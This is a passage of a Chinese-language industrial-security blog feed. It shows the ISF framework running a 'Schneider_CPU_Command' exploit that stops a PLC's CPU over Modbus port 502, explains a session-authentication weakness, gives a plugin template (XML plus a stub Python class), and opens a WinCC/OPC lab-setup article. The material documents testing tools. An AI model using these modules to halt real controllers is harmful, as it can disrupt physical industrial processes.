+isf &amp;gt; show Exploit
+
+Plugin Category: Exploit
+========================
+
+  Name                            Version
+  ----                            -------
+  Schneider_CPU_Command           1.1.0
+  Siemens_300_400_CPU_Control     1.1.0
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;use命令使用，调用相关插件，并根据命令行提示配置参数，如下所示&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;isf&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;use&lt;/span&gt; &lt;span class="n"&gt;Schneider_CPU_Command&lt;/span&gt;
+
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="p"&gt;!&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Entering&lt;/span&gt; &lt;span class="n"&gt;Plugin&lt;/span&gt; &lt;span class="n"&gt;Context&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="n"&gt;Schneider_CPU_Command&lt;/span&gt;
+&lt;span class="o"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Applying&lt;/span&gt; &lt;span class="k"&gt;Global&lt;/span&gt; &lt;span class="n"&gt;Variables&lt;/span&gt;
+
+&lt;span class="o"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Applying&lt;/span&gt; &lt;span class="n"&gt;Session&lt;/span&gt; &lt;span class="n"&gt;Parameters&lt;/span&gt;
+&lt;span class="o"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Running&lt;/span&gt; &lt;span class="n"&gt;Exploit&lt;/span&gt; &lt;span class="n"&gt;Touches&lt;/span&gt;
+
+
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="p"&gt;!&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Enter&lt;/span&gt; &lt;span class="n"&gt;Prompt&lt;/span&gt; &lt;span class="n"&gt;Mode&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="n"&gt;Schneider_CPU_Command&lt;/span&gt;
+
+&lt;span class="n"&gt;Module&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Schneider_CPU_Command&lt;/span&gt;
+&lt;span class="o"&gt;=============================&lt;/span&gt;
+
+  &lt;span class="n"&gt;Name&lt;/span&gt;            &lt;span class="n"&gt;Value&lt;/span&gt;
+  &lt;span class="o"&gt;----&lt;/span&gt;            &lt;span class="o"&gt;-----&lt;/span&gt;
+  &lt;span class="n"&gt;TargetIp&lt;/span&gt;
+  &lt;span class="n"&gt;TargetPort&lt;/span&gt;      &lt;span class="mi"&gt;502&lt;/span&gt;
+  &lt;span class="n"&gt;Command&lt;/span&gt;         &lt;span class="k"&gt;stop&lt;/span&gt;
+
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="p"&gt;!&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;plugin&lt;/span&gt; &lt;span class="n"&gt;variables&lt;/span&gt; &lt;span class="n"&gt;are&lt;/span&gt; &lt;span class="n"&gt;valid&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Prompt&lt;/span&gt; &lt;span class="k"&gt;For&lt;/span&gt; &lt;span class="n"&gt;Variable&lt;/span&gt; &lt;span class="n"&gt;Settings&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Yes&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;
+
+&lt;span class="o"&gt;[*]&lt;/span&gt;  &lt;span class="n"&gt;TargetIp&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="n"&gt;Target&lt;/span&gt; &lt;span class="n"&gt;IP&lt;/span&gt; &lt;span class="n"&gt;Address&lt;/span&gt;
+
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;TargetIp&lt;/span&gt; &lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;192.168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;1.30&lt;/span&gt;
+&lt;span class="o"&gt;[+]&lt;/span&gt; &lt;span class="k"&gt;Set&lt;/span&gt; &lt;span class="n"&gt;TargetIp&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="mf"&gt;192.168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;1.30&lt;/span&gt;
+
+&lt;span class="o"&gt;[*]&lt;/span&gt;  &lt;span class="n"&gt;TargetPort&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="n"&gt;Target&lt;/span&gt; &lt;span class="n"&gt;Port&lt;/span&gt;
+
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;TargetPort&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;502&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="o"&gt;[+]&lt;/span&gt; &lt;span class="k"&gt;Set&lt;/span&gt; &lt;span class="n"&gt;TargetPort&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;502&lt;/span&gt;
+
+&lt;span class="o"&gt;[*]&lt;/span&gt;  &lt;span class="n"&gt;Command&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="n"&gt;control&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="k"&gt;of&lt;/span&gt; &lt;span class="n"&gt;cpu&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;stop&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
+
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Command&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;stop&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="o"&gt;[+]&lt;/span&gt; &lt;span class="k"&gt;Set&lt;/span&gt; &lt;span class="n"&gt;Command&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;stop&lt;/span&gt;
+
+
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="p"&gt;!&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Preparing&lt;/span&gt; &lt;span class="k"&gt;to&lt;/span&gt; &lt;span class="n"&gt;Execute&lt;/span&gt; &lt;span class="n"&gt;Schneider_CPU_Command&lt;/span&gt;
+
+&lt;span class="n"&gt;Module&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Schneider_CPU_Command&lt;/span&gt;
+&lt;span class="o"&gt;=============================&lt;/span&gt;
+
+  &lt;span class="n"&gt;Name&lt;/span&gt;            &lt;span class="n"&gt;Value&lt;/span&gt;
+  &lt;span class="o"&gt;----&lt;/span&gt;            &lt;span class="o"&gt;-----&lt;/span&gt;
+  &lt;span class="n"&gt;TargetIp&lt;/span&gt;        &lt;span class="mf"&gt;192.168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;1.30&lt;/span&gt;
+  &lt;span class="n"&gt;TargetPort&lt;/span&gt;      &lt;span class="mi"&gt;502&lt;/span&gt;
+  &lt;span class="n"&gt;Command&lt;/span&gt;         &lt;span class="k"&gt;stop&lt;/span&gt;
+
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Execute&lt;/span&gt; &lt;span class="n"&gt;Plugin&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Yes&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="o"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Executing&lt;/span&gt; &lt;span class="n"&gt;Plugin&lt;/span&gt;
+&lt;span class="n"&gt;logging&lt;/span&gt; &lt;span class="k"&gt;to&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;
+&lt;span class="o"&gt;[+]&lt;/span&gt; &lt;span class="n"&gt;Schneider_CPU_Command&lt;/span&gt; &lt;span class="n"&gt;Succeeded&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;三、    EXP编写&lt;/h2&gt;
+&lt;p&gt;编写一个EXP需要包含两个文件，一个参数描述性的文件 &lt;em&gt;.xml 和 一个漏洞脚本文件 &lt;/em&gt;.py，两个文件的名字需要相同，xml定义输入输出的参数的基本信息，如下所示，EXP需要三个参数，分别是TargetIp、TargetPort、Command。注意：XML文件中 name 字段不能重复。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;t:config&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;c72514379eaad943b62f4080a5ae1dc61619f0f3&amp;quot;&lt;/span&gt;
+          &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Schneider_CPU_Command&amp;quot;&lt;/span&gt;
+          &lt;span class="na"&gt;version=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1.1.0&amp;quot;&lt;/span&gt;
+          &lt;span class="na"&gt;configversion=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1.1.0.0&amp;quot;&lt;/span&gt;
+          &lt;span class="na"&gt;xmlns:xsi=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;http://www.w3.org/2001/XMLSchema-instance&amp;#39;&lt;/span&gt;
+          &lt;span class="na"&gt;xmlns:t=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;tc0&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+
+  &lt;span class="nt"&gt;&amp;lt;t:inputparameters&amp;gt;&lt;/span&gt;    
+    &lt;span class="nt"&gt;&amp;lt;t:parameter&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;TargetIp&amp;quot;&lt;/span&gt;
+                 &lt;span class="na"&gt;description=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Target IP Address&amp;quot;&lt;/span&gt;
+                 &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;IPv4&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;t:parameter&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;TargetPort&amp;quot;&lt;/span&gt;
+                 &lt;span class="na"&gt;description=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Target Port&amp;quot;&lt;/span&gt;
+                 &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;TcpPort&amp;quot;&lt;/span&gt;
+                 &lt;span class="na"&gt;default=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;502&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;t:parameter&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Command&amp;quot;&lt;/span&gt;
+                 &lt;span class="na"&gt;description=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;The control command of cpu [stop/start]&amp;quot;&lt;/span&gt;
+                 &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;String&amp;quot;&lt;/span&gt;
+                 &lt;span class="na"&gt;default=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stop&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;/t:inputparameters&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/t:config&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;漏洞利用脚本编写方法如下，如果不清楚可以直接拷贝如下模板进行修改&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;1、继承基础类 BaseExploit 
+2、填写POC基础信息 pocinfo
+3、注册命令行，向register_options变量增加make_option对象即可，注意参数名称需要与xml文件保持一致
+4、实现exploit函数&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;span class="c"&gt;# coding=utf-8&lt;/span&gt;
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;core.exploit&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+
+
+&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MyPoc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BaseExploit&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;pocinfo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;ID&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;ICF-2017-000001&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;Name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;施耐德昆腾140系列PLC CPU控制&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;Author&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;w3h&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;Create_Date&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;2017-04-09&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;Description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&amp;#39;施耐德昆腾140系列PLC认证用户时Session使用是单比特，导致攻击者可以向PLC发送CPU控制指令。&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+
+        &lt;span class="s"&gt;&amp;#39;Vendor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;VENDOR&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SI&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;Device&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Schneider Quantum 140&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;App&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;Protocol&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;modbus&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;References&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;CVE&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;CNVD&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;OSVDB&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;CNNVD&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;
+
+        &lt;span class="s"&gt;&amp;#39;Risk&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;RISK&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;H&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="c"&gt;# H/M/L&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;VulType&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;VULTYPE&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;REP&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="n"&gt;register_options&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
+        &lt;span class="n"&gt;make_option&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;--TargetIp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;store&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;TargetIp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+                    &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;string&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;The target of this poc.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+        &lt;span class="n"&gt;make_option&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;--TargetPort&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;store&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;TargetPort&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+                    &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;int&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;502&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;The port of this poc [default:502].&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+        &lt;span class="n"&gt;make_option&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;--Command&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;The constrol commond of cpu&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Command&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stop&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+    &lt;span class="p"&gt;]&lt;/span&gt;
+
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;exploit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getParam&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Command&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TargetIp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TargetPort&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="k"&gt;pass&lt;/span&gt;
+
+&lt;span class="c"&gt;# POC标准入口函数&lt;/span&gt;
+&lt;span class="n"&gt;MainEntry&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MyPoc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">w3h</dc:creator><pubDate>Tue, 04 Jul 2017 14:36:00 +0800</pubDate><guid>tag:icsmaster.com,2017-07-04:tool/isf.html</guid><category>isf</category></item><item><title>基于WinCC多协议通信实验环境搭建</title><link>http://icsmaster.com/security/wincc_env.html</link><description>&lt;h2&gt;一、    概述&lt;/h2&gt;
+&lt;p&gt;目前，随着自动化水平的提高和全厂自动化控制集成的要求，以及基于工业4.0和智能制造的工厂升级和新建工厂的需求。原来单点控制已经不能满足当前的要求。未来方便集成而采用同一家生产商的产品也不太可能。所以现场设备往往有很多设备厂商提供，也造成了不同设备之间通讯、设备和监控平台之间不能直接通讯，单独实现某些设备直接通讯往往也容易增加成本和现场故障点。
+当前，随着工业生产的不断发展，工业控制软件取得了长足的进步。然而，由于生产规模的扩大和过程复杂程度的提高，工业控制软件设计面临着巨大的挑战，那就是要集成数量和种类不断增多的现场信息。在传统的控制系统中，智能设备之间及智能设备与控制系统软件之间的信息共享是通过驱动程序来实现的，不同厂家的设备又使用不同的驱动程序，迫使工业控制软件中包含了越来越多的底层通信模块。
+当前，比较好的解决方案是使用OPC（OLE for Process Control）来实现不同设备和监控平台的通讯，然后实现设备之间的通讯。为此，本文将讲述一种基于WinCC 7.0和IGS（Industry Gateway OPC Server）的解决方案。&lt;/p&gt;
+&lt;h2&gt;二、    OPC&lt;/h2&gt;
+&lt;p&gt;OPC是Object Linking and Embedding（OLE）for Process Control的缩写，它是微软公司的对象链接和嵌入技术在过程控制方面的应用。OPC以OLE/COM/DCOM技术为基础，采用客户/服务器模式，为工业自动化软件面向对象的开发提供了统一的标准，&lt;/p&gt;
+&lt;p&gt;这个标准定义了应用Microsoft操作系统在基于PC的客户机之间交换自动化实时数据的方法。采用这项标准后，硬件开发商将取代软件开发商为自己的硬件产品开发统一的OPC接口程序，而软件开发者可免除开发驱动程序的工作，充分发挥自己的特长，把更多的精力投入到其核心产品的开发上。这样不但可避免开发的重复性，也提高了系统的开放性和可互操作性。&lt;/p&gt;
+&lt;h2&gt;三、    WinCC&lt;/h2&gt;
+&lt;p&gt;西门子视窗控制中心SIMATIC WinCC（Windows Control Center）是HMI／SCADA软件中的后起之秀，1996年进入世界工控组态软件市场，当年就被美国Control Engnieering杂志评为最佳HMI软件，以最短的时间发展成第三个在世界范围内成功的SCADA系统；而在欧洲，它无可争议地成为第一。 
+在设计思想上，SIMATIC WinCC秉承西门子公司博大精深的企业文化理念，性能最全 面、技术最先进、系统最开放的HMI/SCADA软件是WinCC开发者的追求。Wincc是按世 界范围内使用的系统进行设计的，因此从一开始就适合于世界上各主要制造商生产的控制系 统，如A-B，Modicon，GE等，并且通讯驱动程序的种类还在不断地增加。通过OPC的方 式，WinCC还可以与更多的第三方控制器进行通讯。&lt;/p&gt;
+&lt;h2&gt;四、    结构介绍&lt;/h2&gt;
+&lt;p&gt;WinCC7.0本身已提供A-B PLC的驱动，Modicon的驱动和s7的驱动等，为了更好理解WinCC自带驱动，我们使用SIMATIC S7 PROTOCOL SUITE.chn和s7-300的PLC通讯；为了更好理解OPC，我们不使用Allen Bradley - Ethernet IP.chn和Modbus TCPIP.chn驱动，而是使用OPC.chn。由于A-B PLC和Modbus（本使用Schneider Qunantum PLC）和OPC需要协议转换，自己编写比较麻烦，并且后期维护上级也是不小的工作量，所以，在此我们还需要第三方的OPC server实现不同协议的转换。
+以下是系统的结构图。&lt;/p&gt;
